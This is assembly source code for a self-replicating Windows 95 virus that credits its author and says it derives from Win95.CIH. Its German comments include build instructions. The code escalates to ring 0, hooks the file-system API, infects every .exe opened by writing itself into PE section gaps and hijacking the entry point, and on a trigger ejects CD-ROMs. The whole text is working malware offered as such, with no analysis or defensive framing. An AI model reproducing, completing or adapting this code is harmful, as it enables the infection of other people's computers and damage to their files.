   ; rRlf Virus by Jimmy@rRlf.de
   ;
   ; Eigentlicher Virus Code vom Win95.CIH Virus,
   ; verbesserte Einsprungspunkte und Call Mechanismen
   ; Bessere Call Coordination, ohne Bugs
   ; wird ab 6.Aug2001 von AVp als Win95.CIH erkannt
   ;
   ; Entstand: Aus Ehrfurcht vom alten Win.Cih Virus.
   ;
   ;
   ; Gibt es demnächst auch als I-Worm. Variante
   ;


   ; Kompillierung
   ; Tasm32 -ml -m2 rRlf.asm
   ;
   ; Tlink32 -Tpe rRlf.asm import32.lib
   ;


   include rRlf.inc
   include drp.inc
   include ilb.inc
   include ios.inc
   include isp.inc
   include ior.inc

   DCB_type_cdrom        equ        5

   DEBUG = 0

   .386p
   .model flat

   extrn ExitProcess:PROC

   .data

   rRlf_Start:

                   pusha
                   call      rRlf_Init
   rRlf_Init:
                   pop       EBP
                   sub       EBP, offset(rRlf_Init - rRlf_Start)

                   call      set_seh
                   mov       ESP, [ESP + 8]
                   jmp       short Exit_Main
   set_seh:
                   push      4 ptr FS:[0]
                   mov       FS:[0], ESP

                   call      get_r0

                   call      ring0_proc
                   retf
   get_r0:
                   pop       ESI

                   push      EBX
                   sgdt      [ESP - 2]
                   pop       EBX

                   sldt      AX
                   and       EAX, not 111b
                   jz        short Exit_Main

                   add       EBX, EAX

                   mov       EDI, [EBX + 2 - 2]
                   mov       AH, [EBX + 7]
                   mov       AL, [EBX + 4]
                   shrd      EDI, EAX, 16

                   fild      8 ptr [EDI]

                   mov       EAX, ESI
                   cld
                   stosw
                   mov       EAX, 1110110000000000b shl 16 + 28h
                   stosd
                   shld      EAX, ESI, 16
                   stosw

                   db        9Ah
                   dd        0
                   dw        100b + 11b

                   fistp     8 ptr [EDI - 8]

   Exit_Main:
                   pop       4 ptr FS:[0]
                   pop       EAX
                   popa

                   db        68h

   Exit_VA = $ - rRlf_Start

                   dd        offset exit
                   retn

   ring0_proc:
                   pushad
                   mov       EAX, DR3
                   cmp       EAX, 'rRlf'
                   je        exit_r0


                   push      PAGEFIXED + PAGEZEROINIT
                   xor       EAX, EAX
                   push      EAX
                   push      EAX
                   push      EAX
                   push      EAX
                   push      EAX
                   push      PG_SYS
                   push      virpages

   PatchOffset = $ - rRlf_Start

                   VMMcall   PageAllocate

                   add       ESP, 32
                   or        EAX, EAX
                   jz        short exit_r0

                   db        0BBh
   Obj_Tbl_VA = $ - rRlf_Start
                   dd        40018Fh

                   db        0BAh
   MainLen_Offset = $ - rRlf_Start
                   dd        virusLen


                   cld
                   mov       EDI, EAX
                   mov       ESI, EBP
                   mov       ECX, EDX
                   rep movsb

   copy_next:
                   cmp       EDX, virusLen
                   je        short make_clear_copy
                   mov       ESI, [EBX + 18h + 4]
                   mov       ECX, [EBX + 18h]
                   mov       EDI, EDX
                   add       EDI, EAX
                   add       EDX, ECX
                   add       EBX, 28h
                   rep movsb
                   jmp       short copy_next

   make_clear_copy:
                   mov       ESI, EAX
                   lea       EDI, [EAX + virbuffer - rRlf_Start]
                   mov       ECX, EDX
                   rep movsb


                   lea       EDI, [EAX + virbuffer - rRlf_Start + PatchOffset]
                   mov       2 ptr [EDI], 20CDh
                   mov       4 ptr [EDI + 2], 00010053h

                   mov       ESI, EAX
                   push      EAX
                   add       ESI, offset(IFSAPI_handler - rRlf_Start)

                   push      ESI
                   VxDcall   IFSMGR, InstallFileSystemApiHook
                   add       SP, 4
                   pop       EDI

                   mov       [EDI + old_IFSAPI - rRlf_Start], EAX


                   mov       EAX, 'rRlf'
                   mov       DR3, EAX

   exit_r0:
                   popad
                   retn

   Loader_Size = $ - rRlf_Start


   IFSAPI_handler:
                   pushad
                   call       get_addr

   get_addr:
                   pop        EBP
                   sub        EBP, get_addr - IFSAPI_handler

                   lea        EAX, [EBP + semafore - IFSAPI_handler]
                   cmp        1 ptr [EAX], 0
                   jne        Exit_IFSAPI_handler


                   inc        1 ptr [EAX]
                   push       EAX


                   cmp        4 ptr function, IFSFN_OPEN
                   jne        End_IFSAPI_handler

                   mov        AL, 08h
                   out        70h, AL
                   in         AL, 71h
                   test       AL, AL
                   jp         work

                   lea        EAX, [EBP + ctr - IFSAPI_handler]
                   dec        2 ptr [EAX]
                   jnz        short work


                   dec        2 ptr [EBP + fuck - IFSAPI_handler]
                   mov        EDI, [EBP + fuck - IFSAPI_handler]
                   mov        [EAX], EDI

                   lea        EDI, [EBP + drp - IFSAPI_handler]
                   push       EDI
                   lea        EBX, [EBP + ilb - IFSAPI_handler]
                   mov        [EDI].DRP_ilb, EBX
                   mov        [EDI].DRP_LGN, DRP_IFS

                   cld
                   xor        ECX, ECX
                   mov        CL, 8
                   mov        AL, 'X'
                   repz       stosb

                   VxDcall    IOS_Device_ID, IOS_Register
                   pop        EDI

                   mov        EAX, [EBX]
                   test       EAX, EAX
                   jz         short work

                   lea        EBX, [EBP + isp - IFSAPI_handler]
                   mov        [EBX].ISP_func, ISP_GET_FIRST_NEXT_DCB
                   mov        [EBX].ISP_gfnd_dcb_type, DCB_type_cdrom
                   push       EBX
                   call       EAX
                   pop        EBX

                   cmp        [EBX].ISP_result, 0
                   jne        short work

                   mov        EDI, [EBX].ISP_gfnd_found_dcb
                   lea        ESI, [EBP + ior - IFSAPI_handler]
                   mov        AL, [EDI + 14h]
                   mov        [ESI].IOR_vol_designtr, AL
                   mov        [ESI].IOR_func, IOR_EJECT_MEDIA
                   mov        [ESI].IOR_flags, IORF_VERSION_002 or IORF_SYNC_COMMAND
                   VxDcall    IOS_Device_ID, IOS_SendCommand


   work:


                   lea        EDI, [EBP + filepath - IFSAPI_handler]
                   mov        EAX, drive
                   or         AL, AL
                   jle        End_IFSAPI_handler
                   lea        EBX, ioreq_ptr
                   add        AL, 64
                   stosb
                   mov        AL, ':'
                   stosb
                   push       0
                   push       7Fh
                   mov        EBX, [EBX]
                   mov        EAX, [EBX + 0Ch]
                   add        EAX, 4
                   push       EAX
                   push       EDI
                   VxDcall    IFSMGR, UniToBCSPath
                   add        ESP, 10h
                   or         EDX, EDX
                   jne        End_IFSAPI_handler
                   mov        EDX, EDI
                   add        EDI, EAX
                   mov        1 ptr [EDI], 0


                   mov        EAX, [EDI - 4]
                   or        EAX, 20202000h

           IF DEBUG
                   cmp        EAX, 'zzz.'
           ELSE
                   cmp        EAX, 'exe.'
           ENDIF
                   jne        End_IFSAPI_handler


                   mov        ESI, EDX
                   mov        EAX, R0_FILEATTRIBUTES
                   VxDcall    IFSMGR, Ring0_FileIO

                   jc         End_IFSAPI_handler


                   mov        EDI, ECX
                   xor        ECX, ECX
                   mov        EAX, R0_FILEATTRIBUTES + 1
                   VxDcall    IFSMGR, Ring0_FileIO
                   jc         End_IFSAPI_handler
                   push       EDX
                   push       EDI


                   call       fopen
                   jc         RestoreAttrs
                   mov        [EBP + hfile - IFSAPI_handler], EAX


                   xor        ESI, ESI
                   mov        ECX, bytes_to_read
                   lea        EDX, [EBP + buffer - IFSAPI_handler]
                   call       fread
                   jc         Close_File

                   cmp        2 ptr [EDX], 'ZM'
                   jne        Close_File

                   mov        ESI, [EDX + 3Ch]
                   mov        EAX, ESI
                   add        ESI, EDX
                   cmp        2 ptr [ESI], 'EP'
                   jne        Close_File

                   cmp        [ESI + 44h], 'flRr'
                   je         Close_File

                   movzx      EDI, 2 ptr [ESI + 14h]
                   add        EDI, 18h
                   mov        EDX, 4 ptr [ESI + 34h]
                   add        EDX, EAX
                   add        EDX, EDI
                   mov        [EBP + virbuffer - IFSAPI_handler + Obj_Tbl_VA], EDX
                   add        EDI, ESI


                   movzx      EBX, 2 ptr [ESI + 06h]
                   mov        ECX, EBX
                   xor        EAX, EAX
                   push       EDI
   summ:
                   mov        EDX, [EDI + 10h]
                   sub        EDX, [EDI + 08h]
                   js         short skip_obj
                   add        EAX, EDX
   skip_obj:
                   add        EDI, 28h
                   loop       short summ

                   pop        EDX
                   sub        EAX, virusLen
                   js         Close_File


                   mov        EDI, EDX
                   mov        ECX, EBX
   next_sect:
                   mov        EAX, [EDI + 10h]
                   sub        EAX, [EDI + 08h]
                   sub        EAX, Loader_Size
                   jns        short Write_Code
                   add        EDI, 28h
                   loop       short next_sect

                   jmp        Close_File

   Write_Code:
                   mov        [ESI + 44h], 'yj'
                   mov        EAX, [ESI + 34h]

                   mov        [EBP + imgb - IFSAPI_handler], EAX

                   mov        ECX, [ESI + 28h]
                   add        ECX, EAX

                   mov        [EBP + virbuffer - IFSAPI_handler + Exit_VA], ECX


                   mov        EAX, [EDI + 0Ch]
                   add        EAX, [EDI + 08h]
                   mov        [ESI + 28h], EAX


                   mov        EAX, virusLen
                   mov        ECX, [EDI + 10h]
                   sub        ECX, [EDI + 08h]
                   cmp        ECX, EAX
                   jna        short not_above_vir_size
                   mov        ECX, EAX

   not_above_vir_size:
           db  'The rRlf Virus by Jimmy',0
                   lea        EAX, [EBP + virbuffer - IFSAPI_handler + MainLen_Offset]
                   mov        [EAX], ECX


                   or         4 ptr [EDI + 24h], 40000000h or 20000000h or 00000040h
                   btc        4 ptr [EDI + 24h], 25

                   mov        ESI, [EDI + 14h]
                   add        ESI, [EDI + 08h]
                   add        [EDI + 08h], ECX

                   mov        EDI, EDX

                   lea        EDX, [EBP + virbuffer - IFSAPI_handler]
                   call       fwrite
                   jc         short Close_File


                   mov        EDX, ECX
   process_next:
                   mov        ECX, virusLen
                   sub        ECX, EDX
                   jz         short Write_Header

                   mov        EAX, [EDI + 10h]
                   sub        EAX, [EDI + 08h]
                   js         short skip_sect
                   jz         short skip_sect
                   cmp        EAX, ECX
                   jg         short greater
                   mov        ECX, EAX
   greater:

                   or         4 ptr [EDI + 24h], 40000000h or 00000040h
                   btc        4 ptr [EDI + 24h], 25

                   mov        ESI, [EDI + 0Ch]
                   add        ESI, [EDI + 08h]
                   add        ESI, [EBP + imgb - IFSAPI_handler]

                   mov        [EDI + 18h + 4], ESI
                   mov        [EDI + 18h], ECX

                   mov        ESI, [EDI + 14h]
                   add        ESI, [EDI + 08h]
                   add        [EDI + 08h], ECX

                   mov        EAX, EDX
                   lea        EDX, [EBP + virbuffer - IFSAPI_handler]
                   add        EDX, EAX
                   call       fwrite
                   jc         short Close_File
                   add        EAX, ECX
                   mov        EDX, EAX
   skip_sect:
                   add        EDI, 28h
                   dec        EBX
                   jnz        short process_next

   Write_Header:

                   lea        EDX, [EBP + buffer - IFSAPI_handler]
                   xor        ESI, ESI
                   mov        ECX, bytes_to_read
                   call       fwrite

   Close_File:
                   call       fclose

   RestoreAttrs:
                   pop        ECX
                   pop        ESI
                   mov        EAX, R0_FILEATTRIBUTES + 1
                   VxDcall    IFSMGR, Ring0_FileIO

   End_IFSAPI_handler:
                   pop        EAX
                   dec        1 ptr [EAX]

   Exit_IFSAPI_handler:

                   popad
                   db        0FFh, 25h

   old_IFSAPI label dword

                   dd        0



   access_eax        equ     (dword ptr 7*4)

   fopen:
                   pusha
                   mov        EAX, R0_OPENCREATFILE
                   mov        ESI, EDX
                   mov        BX, 2022h
                   mov        CX, 32
                   mov        DX, 01h
                   VxDcall    IFSMGR, Ring0_FileIO
                   mov        [ESP].access_eax, EAX
                   popa
                   ret


   fclose:
                   pusha
                   mov        EBX, [EBP + hfile - IFSAPI_handler]
                   mov        EAX, R0_CLOSEFILE
                   VxDcall    IFSMGR, Ring0_FileIO
                   popa
                   ret

   fread:
                   pusha
                   mov        EBX, [EBP + hfile - IFSAPI_handler]
                   mov        EAX, R0_READFILE
                   xchg       EDX, ESI
                   VxDcall    IFSMGR, Ring0_FileIO
                   popa
                   ret

   fwrite:
                   pusha
                   mov        EBX, [EBP + hfile - IFSAPI_handler]
                   mov        EAX, R0_WRITEFILE
                   xchg       EDX, ESI
                   VxDcall    IFSMGR, Ring0_FileIO
                   popa
                   ret

   fuck            dw                        5000
   ctr             dw                        5000
   virusLen        equ        ($ - rRlf_Start)

   bytes_to_read   equ                       500h
   path_len        equ                       300

   hfile           dd                        ?
   imgb            dd                        ?
   semafore        db                        0
   filepath        db                        path_len dup (?)
   virbuffer       db                        virusLen dup (?)
   drp             DRP                       ?
   ilb             ILB                       ?
   isp             ISP_GET_FRST_NXT_DCB      ?
   ior             IOR                       ?
   buffer          db                        bytes_to_read dup (?)


   virpages        equ        ($ - rRlf_Start + 4095) / 4096

   .code

   start:
                   call        rRlf_Start
   exit:
                   push        00000000h
                   call        ExitProcess
   end start
